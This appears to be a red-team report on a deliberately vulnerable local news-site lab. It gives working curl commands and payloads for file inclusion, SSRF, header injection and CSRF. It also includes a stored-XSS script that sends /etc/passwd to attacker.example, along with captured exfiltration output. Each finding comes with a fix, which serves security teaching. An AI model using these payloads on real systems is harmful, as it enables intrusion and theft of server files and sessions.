# Red-team pass — HaMivtzar News Lab

An offensive walk of the lab that goes **beyond the 15 intentionally-tagged
weaknesses**, looking for unintended bugs, higher-impact variants, and
exploit chains. Everything below was run live against a local instance
(`http://127.0.0.1:8110` during testing; default `:8099`). Target is the
self-owned lab only — see [`../SCOPE.md`](../SCOPE.md).

The highest-impact machine-checkable items are regression-locked in
[`run_all.py`](run_all.py) (`VULN-03b`, `VULN-04b`, `VULN-04c`, `VULN-16`,
`VULN-17`); the full chain (G) is demonstrated by
[`exploit_chain_G.py`](exploit_chain_G.py).

## Findings summary

| # | Finding | Severity | Notes |
|---|---------|----------|-------|
| A | LFI absolute-path read (no `../`) | **High** | elevates VULN-03 to full arbitrary read incl. source |
| B | SSRF `file://` = second read primitive | **High** | elevates VULN-04 |
| C | CRLF / HTTP response-splitting (`/go`) | **High** | elevates VULN-09; Set-Cookie & cache poisoning |
| D | SSRF port-scan oracle (verbose errors) | Medium | maps internal services |
| E | CSRF on all state-changing POSTs | **High** | wormable with stored XSS |
| F | Admin creds in URL → leak to access logs | Medium | plus history/Referer |
| G | Chain: CSRF → stored XSS → LFI exfil | **Critical** | proven end-to-end in a real browser (`exploit_chain_G.py`) |
| H | Unbounded stored input | Low | memory-exhaustion surface |
| I | Redirect-based SSRF bypass | **High** | defeats a naive host allow-list |
| J | Extra SSRF schemes (`data:`, `file:`) | Medium | + metadata-service path on cloud |
| K | Latent race on shared stores | Low | real bug, GIL-masked — not exploited |
| L | `Transfer-Encoding: chunked` ignored (VULN-18) | Low* | CL.TE smuggling surface behind a proxy (*High) |

---

## A — LFI absolute-path read (elevates VULN-03)
`route_ajaxpage` does `os.path.join(FEEDS_DIR, name)`. In Python, joining an
**absolute** second component discards the base — so no `../` is needed:
```bash
curl -s 'http://127.0.0.1:8099/AjaxPage?jspName=/etc/passwd'          # root:x:0:0:...
curl -s 'http://127.0.0.1:8099/AjaxPage?jspName=/etc/hostname'
# read the app's own source to harvest logic/secrets:
curl -s 'http://127.0.0.1:8099/AjaxPage?jspName=/proc/self/cwd/app.py' | grep ADMIN_PASS
```
**Fix:** reject names containing `/`, `\`, or `..`; resolve with
`os.path.realpath` and assert the result is inside `FEEDS_DIR`; prefer an
allow-list of known feed names.

## B — SSRF via `file://` (elevates VULN-04)
`urllib.request.urlopen` honours the `file:` scheme, so the "recommendation
proxy" is also an arbitrary local-file reader:
```bash
curl -s 'http://127.0.0.1:8099/proxy/multivac?url=file:///etc/passwd'
```
**Fix:** allow-list schemes to `http`/`https`; block `file`/`ftp`/`gopher`/etc.;
plus the host allow-list from VULN-04.

## C — CRLF / HTTP response-header injection (elevates VULN-09)
`/go` puts `url` straight into the `Location` header. Because it's unsanitised,
`%0d%0a` splits the response and injects headers — including `Set-Cookie`
(session fixation) and cache-control (cache poisoning):
```bash
curl -si 'http://127.0.0.1:8099/go?url=/x%0d%0aX-Injected:%20pwned'
curl -si 'http://127.0.0.1:8099/go?url=/%0d%0aSet-Cookie:%20SESSIONID=attacker-fixed%3B%20Path=/'
```
Both inject real headers into the response. This is materially worse than a
plain open redirect.
**Fix:** strip/reject CR and LF in any header value; use an allow-list of
internal destinations; rely on a framework that validates header values.

## D — SSRF port-scan oracle
The proxy's verbose error (`<urlopen error [Errno 111] Connection refused>`)
distinguishes closed from open ports, turning the SSRF into an internal scanner:
```bash
curl -s 'http://127.0.0.1:8099/proxy/multivac?url=http://127.0.0.1:8099/'   # body -> open
curl -s 'http://127.0.0.1:8099/proxy/multivac?url=http://127.0.0.1:9999/'   # Errno 111 -> closed
```
**Fix:** return a generic error; never echo the upstream exception to the client.

## E — CSRF on state-changing POSTs
`/api/chat` and `/api/comments` accept writes with no CSRF token and no
Origin/Referer check — any origin can forge them:
```bash
curl -s -X POST 'http://127.0.0.1:8099/api/comments' \
     -H 'Origin: https://evil.example.com' \
     --data 'articleId=1001&name=CSRF&text=posted-cross-origin'
```
**Fix:** per-session CSRF tokens (double-submit or synchroniser); check
`Origin`/`Sec-Fetch-Site`; `SameSite=Lax/Strict` cookies once sessions exist.

## F — Admin credentials in the URL → logs
`/admin` takes `user`/`pass` as **GET** query params, so credentials land in the
server access log, browser history, and any `Referer`:
```bash
curl -s 'http://127.0.0.1:8099/admin?user=admin&pass=hunter2' -o /dev/null
# -> the log line for that request contains pass=hunter2 in cleartext
```
**Fix:** POST credentials over TLS; never log query strings for auth routes;
scrub secrets from logs.

## G — Weaponised chain (Critical): CSRF → stored XSS → LFI exfil
1. **CSRF** delivers a **stored-XSS** comment (VULN-11 / VULN-17):
2. the comment's JS uses the **LFI** (A) to read a local file and exfiltrates it
   to an attacker host — firing in *every* visitor's browser:
```js
<script>
  fetch('/AjaxPage?jspName=/etc/passwd')
    .then(r => r.text())
    .then(d => new Image().src = '//attacker.example/x?' + btoa(d));
</script>
```
The comment persists verbatim (confirmed unescaped on `/article?id=1001`), so
one forged request turns into server-file exfiltration from visitors' sessions.
**Fix:** any *one* of {escape comment output, sanitise input, CSP without
`unsafe-inline`, fix the LFI} breaks the chain — defence in depth means fixing
all of them.

## H — Unbounded stored input
`/api/chat` and `/api/comments` accept arbitrarily large bodies and grow the
in-memory lists without bound → memory-exhaustion surface:
```bash
curl -s -X POST 'http://127.0.0.1:8099/api/chat' \
     --data-urlencode "text=$(python3 -c 'print("A"*100000)')"
```
**Fix:** cap body size (`Content-Length` limit), cap stored item count/length,
persist to a bounded store.

---

## Round 2 — going deeper

### G proven end-to-end in a real browser
`exploit_chain_G.py` weaponises finding G against a fresh local instance: it
plants the stored-XSS comment via a **forged cross-origin POST** (the CSRF),
then drives a **real headless Chromium** to the article page. The browser
executes the stored script, which reads `/etc/passwd` through the **LFI** and
beacons it (base64, via `<img>`) to an attacker "collector" the script runs.
Captured output confirms full server-file exfiltration from the browser:
```
[+] CSRF POST planted the XSS comment (HTTP 200, cross-origin, no token)
[*] launching headless Chromium at the article page ...
[!!] EXFILTRATION SUCCEEDED — attacker collector received /etc/passwd
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   ...
```
Run it: `python3 attacks/exploit_chain_G.py` (self-contained; local only).
This is the difference between "the payload persists" and "the payload steals
files from visitors" — the chain, demonstrated.

### I — Redirect-based SSRF bypass (defeats a naive host allow-list)
`urlopen` transparently **follows redirects**, so validating only the *initial*
URL's host is insufficient — an attacker-controlled external host can `302` to
an internal target:
```
attacker :8123  ->  302 Location: http://127.0.0.1:<lab>/config/version
proxy?url=http://attacker:8123/  ->  returns the internal config (bypass)
```
Confirmed reaching internal `/config/version` this way. **Fix:** disable
redirects (`urllib` custom `HTTPRedirectHandler` that blocks them), or
re-validate the host/scheme on **every** hop; combine with the scheme
allow-list from B.

### J — Extra SSRF schemes
`urlopen` also honours `data:` (`data:text/plain,…` is returned verbatim) in
addition to `file:` (B). `ftp:` returns 502 here (no server). On a cloud host
the same SSRF would reach the link-local metadata service
(`http://169.254.169.254/…`) — not reachable from this lab, but the same code
path. **Fix:** strict scheme allow-list (`http`/`https` only) + block
link-local/private ranges + no redirects.

### K — Latent race condition (reported honestly, low)
`route_chat_post` / `route_comments_post` do an unlocked read-modify-write of
shared state (`id = base + len(store)` then insert/append) under
`ThreadingHTTPServer`. This is a real data race *in principle*, but under
CPython's GIL the window is tiny: hammering with 400+ concurrent writes
produced **zero** duplicate ids across repeated runs, and no crashes on
concurrent read+write. Flagged as a latent correctness bug, **not** a working
exploit. **Fix:** guard shared state with a `threading.Lock`, or use a real
datastore that allocates ids atomically. (Don't rely on the GIL for
correctness — a non-CPython runtime or slower per-op work would widen the gap.)

---

## Round 3 — more vectors (one hit, several ruled out)

### L — `Transfer-Encoding: chunked` ignored (VULN-18, CL.TE desync surface)
`do_POST` reads `Content-Length` and never honours `Transfer-Encoding: chunked`
(RFC 7230 requires TE to take precedence). A chunked POST is accepted (`302`)
but its body is read as **zero bytes** — the payload is silently dropped:
```
POST /api/chat HTTP/1.1
Transfer-Encoding: chunked
...
1e
reporter=chunkbot&text=SMUGGLED
0
```
→ server returns 302, `SMUGGLED` is **not** stored (body ignored). Standalone
impact is limited because the app speaks HTTP/1.0 and closes the connection, so
leftover bytes are discarded — but if fronted by a proxy that *does* decode
chunked and forwards raw bytes, this is the classic **CL.TE request smuggling**
desync. **Fix:** reject requests that carry both `Content-Length` and
`Transfer-Encoding`, or implement chunked decoding; run behind a proxy that
normalises framing. Flagged **Low** standalone / **High** behind a mismatched
proxy.

### Ruled out (negative results — good to record)
| Vector tried | Result | Why |
|--------------|--------|-----|
| ReDoS in `deobfuscate.py` array regex | **safe** | non-overlapping alternation `(?:\\.|[^'\\])*`; 60k-char pathological input parsed in ~0 ms (linear) |
| SSRF via `gopher:` / `dict:` / `redis:` | **not reachable** | `urllib` registers no handler → `unknown url type`; the redis/memcached SSRF pivot is unavailable |
| Timing oracle on admin password compare | **not usable** | over loopback the per-char `==` difference (ns) is swamped by GIL/threading/network noise; trimmed-mean deltas were non-monotonic |

### Noted DoS surfaces (not exercised)
- `ThreadingHTTPServer` spawns a thread per connection with no cap → slowloris /
  thread-exhaustion. Not run (no DoS against the host), noted for completeness.
- Unbounded stored input (finding H) is the memory-exhaustion counterpart.

---

## Method notes
- Pure black-box probing with `curl` + a couple of Python one-liners, then
  source review of `app.py` to confirm root causes.
- No DoS was actually run against the host; H is noted as a surface, not exercised.
- Re-run the machine-checked subset any time with `python3 run_all.py`
  (now includes VULN-03b / 04b / 16 / 17).
